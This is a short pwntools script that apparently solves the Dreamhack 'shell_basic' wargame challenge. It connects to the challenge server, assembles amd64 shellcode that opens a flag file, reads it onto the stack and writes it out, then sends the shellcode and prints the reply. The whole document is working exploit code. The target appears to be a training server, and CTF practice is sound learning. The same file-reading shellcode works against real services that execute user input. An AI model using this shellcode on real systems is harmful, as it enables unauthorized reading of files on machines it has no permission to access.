from pwn import *

p = remote("host3.dreamhack.games",  12915)

context.arch = "amd64"
path = "/home/shell_basic/flag_name_is_loooooong"

shellcode = shellcraft.open(path)
shellcode += shellcraft.read('rax', 'rsp', 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)
shellcode = asm(shellcode)

p.sendlineafter("shellcode: ", shellcode)
print(p.recv(0x30))